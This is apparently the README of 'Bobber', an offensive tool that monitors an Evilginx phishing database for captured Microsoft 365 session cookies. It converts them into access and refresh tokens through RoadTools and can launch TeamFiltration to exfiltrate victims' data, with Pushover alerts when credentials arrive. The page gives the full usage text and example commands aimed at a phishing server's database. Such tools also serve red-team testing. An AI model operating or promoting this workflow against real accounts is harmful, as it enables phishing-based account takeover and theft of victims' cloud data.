# Bobber - Bounces when a fish bites!
```
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
```
Bobber monitors a given Evilginx database file for changes, and if a valid Evilginx session complete with a captured Microsoft Office 365 cookie is found, Bobber will utilize the RoadTools RoadTX library to retrieve the access and refresh token for the user, then optionally trigger TeamFiltration to exfiltrate all the sweet, sweet loot. Bobber supports monitoring a local file path or a file path on a remote host through SSH.

Bobber accepts a number of input arguments to adjust the RoadTools interactive auth flow, selection between key and credentials-based SSH auth, as well as the added benefit of getting pushover notifications once a user submits their credentials and the loot is on the way.

```
usage: Bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [-c CLIENT] [-r RESOURCE] [-s SCOPE]
                 [-ru URL] [-t TENANT] [-d DRIVER_PATH] [-k]
                 database_path

Evilginx database location

positional arguments:
  database_path         Path to the local OR remote Evilginx database file.

options:
  -h, --help            show this help message and exit

SSH Options:
  Options for fetching the Evilginx database from a remote host via SSH

  --host HOST           SSH hostname/IP when fetching from a remote host.
  --port PORT           SSH port when fetching from a remote host.
  --username USERNAME   SSH username when fetching from a remote host.
  --password PASSWORD   SSH password when fetching from a remote host.
  --key KEY             Path to the SSH private key file for authentication.

Pushover Options:
  Options for sending Pushover notifications

  --user-key USER_KEY   Pushover User Key
  --api-token API_TOKEN
                        Pushover API Token

RoadTools Options:
  Options for the interactive authentication Selenium flow from RoadTools roadtx

  -c CLIENT, --client CLIENT
                        Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)
  -r RESOURCE, --resource RESOURCE
                        Resource to authenticate to, full URL
  -s SCOPE, --scope SCOPE
                        Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.
  -ru URL, --redirect-url URL
                        Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)
  -t TENANT, --tenant TENANT
                        Tenant ID or domain to auth to
  -d DRIVER_PATH, --driver-path DRIVER_PATH
                        Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)
  -k, --keep-open       Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials

```

# Example Usage

Monitor a local file for changes, get pushover notifications when a new session is found
```
python Bobber.py evilginx_data.db --user-key  98fc5roupp78g0ymvzcw2ygun2gz7u --api-token jg3sycg5lwkqoxa647eaqzdhnrtlwy
```

Monitor a remote file for changes, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has done it's magic
```
python Bobber.py --username root --host 1337.66.69.420 "/root/.evilginx/data.db" --keep-open
```

Monitor a remote file for changes, authenticate using a username and password, 
```
python Bobber.py --username root --password 'MySuperPass123!' --host 1337.66.69.420 "/root/.evilginx/data.db"
```